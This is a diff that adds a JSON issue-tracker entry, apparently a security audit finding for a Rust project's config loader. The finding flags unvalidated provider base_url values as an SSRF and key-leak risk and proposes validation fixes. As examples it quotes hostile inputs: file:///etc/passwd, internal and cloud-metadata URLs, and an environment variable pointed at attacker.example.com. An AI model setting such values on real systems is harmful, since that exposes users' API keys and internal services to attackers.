@@ -1,0 +1,11 @@
+{
+  "uuid": "b3518c3c-a725-4867-a37d-52f3cc321548",
+  "display_id": 329,
+  "title": "Config load: no validation of provider base_url (SSRF / protocol allowlist)",
+  "description": "Steps to reproduce:\n1. \n\nExpected: \nActual: \n\n**Dimension**: Security and Access (SSRF)\n\n**Location**: src/config/mod.rs:108-195 (load_config), src/config/provider.rs:40-50 (ProviderConfig.base_url)\n\n**Violation**: ProviderConfig.base_url is loaded as a plain String with no validation:\n- No scheme allowlist — `file:///etc/passwd`, `http://10.0.0.1/` (internal RFC1918), `http://metadata.google.internal/` (cloud metadata) all accepted\n- No host validation — loopback / link-local / metadata endpoints not blocked\n- A compromised or misconfigured env var (OPENCLAUDIA_PROVIDERS_ANTHROPIC_BASE_URL=http://attacker.example.com) silently redirects all API traffic with the user's legitimate API key attached.\n- load_config() returns the config without verifying reachability or TLS validity.\n\nAdditionally, proxy.host (config/proxy.rs:8) defaults to 127.0.0.1 which is correct, but the bind is not enforced — nothing prevents binding 0.0.0.0 accidentally, exposing the proxy (with stored API keys) to LAN.\n\n**Mandated Refactor**:\n1. Add `validate_base_url(url: &str) -> Result<(), ConfigError>` called per-provider after deserialization. Enforce scheme ∈ {https} by default; allow http only for explicit host='localhost'|'127.0.0.1' (dev mode).\n2. Reject RFC1918 / link-local / cloud-metadata IPs in non-dev mode.\n3. Warn loudly if proxy.host != 127.0.0.1 and emit an audit log entry.\n4. Use the `url` crate to parse and enforce.",
+  "status": "open",
+  "priority": "high",
+  "created_by": "lOrm",
+  "created_at": "2026-04-18T00:33:09.451889446Z",
+  "updated_at": "2026-04-18T00:33:09.451889446Z"
+}
